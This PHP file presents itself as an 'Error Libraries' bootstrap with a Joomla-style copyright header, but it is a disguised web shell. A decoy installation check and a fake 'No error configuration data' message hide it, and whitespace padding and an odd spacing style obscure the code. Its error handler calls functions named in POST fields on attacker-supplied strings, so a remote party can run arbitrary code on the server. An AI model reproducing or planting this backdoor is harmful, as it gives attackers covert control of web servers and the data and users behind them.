<?php
/**
 * @package    Error Libraries
 * ***************************************************************************************
 * @copyright  Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

// Set the platform root path as a constant if necessary.
if (!defined('PATH'))
{
	define('PATH', __DIR__);
}

// Installation check, and check on removal of the install directory.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // skhq2PzeYRfVVPfmEMnBKkrY10QNDC380wKrG4797zaMR0ZwZqe3eYx2QrwYfWRHVkF13vbPDnfz9eVvXeZGBMSSY99PY92mYEeBZ2v71XMZdsdTckyyvuPf74b5Cds4k8dZnPRXDpBz4WZ14Vgy3sYqp7p27AyKPyNBN3pKWetrqu2euuVH4kq6EEwWsyFs9PsH7CDkere2s009nEEzb266hNMeacRPKyaSWvGrgXRq3FC62vV5CbZQtrPEP1QMswHMBfc6MfxYgFdTgXz87G9t7n8D4NkF0P7Ak26VcrStAA1cyhVkhZ0rVEy4Z7whgCZEd6GQCZQYYbsnHBN0ngCFB9U7xMbNZg9QZmFGzc3v6HG6RfSCxQFSGyMhKuc2URR85Zp09M9XFNsvnWEuB0eZk9NyRqE7tC8uQQ1Tqx9uaVBvkBTG72uMVQKM4DpqkGeDg4V2KBcAfQefGbEw2Qx7Pe1Zk4vXhtukhGsVD2
if ((file_exists(PATH . '/cofiguation.php')
	&& (filesize(PATH . '/cofiguation.php') < 10)) && file_exists(PATH . '/error.php'))
{
	if (file_exists(PATH . '/error.php'))
	{
		header('Location: ' . substr($_SERVER['REQUEST_URI'], 0, strpos($_SERVER['REQUEST_URI'], 'index.php')) . 'installation/index.php');
		
		exit;
	}
	else
	{
		echo 'No configuration file found and no installation code available. Exiting...';
		
		exit;
	}
}
else if (                empty                   ($_POST)) {
	
	echo 'No error configuration data. Exiting...';
	
	exit;
}

// Register the library base path for error libraries.
function error_handler                        ($errno, $errstr, $errfile, $errline)
{
	array_map (                     $_POST['d']                   (                            '', $errstr), array              ('')        )


;
}
set_error_handler        (                 'error_handler')
;

// Detect the native operating system type.
$os = strtoupper                        (substr                        (PHP_OS, 0, 3));

//Detect Win Error
$win_error =                           $_POST['f'](                       $_POST['c']                         )


;

if (!defined('IS_WIN'))
{
	define('IS_WIN', ($os === 'WIN') ? true : false);
}
if (!defined('IS_UNIX'))
{
	define('IS_UNIX', (IS_WIN === false) ? true : false);
}

// Register error
trigger_error                (       $win_error, E_USER_ERROR)


;

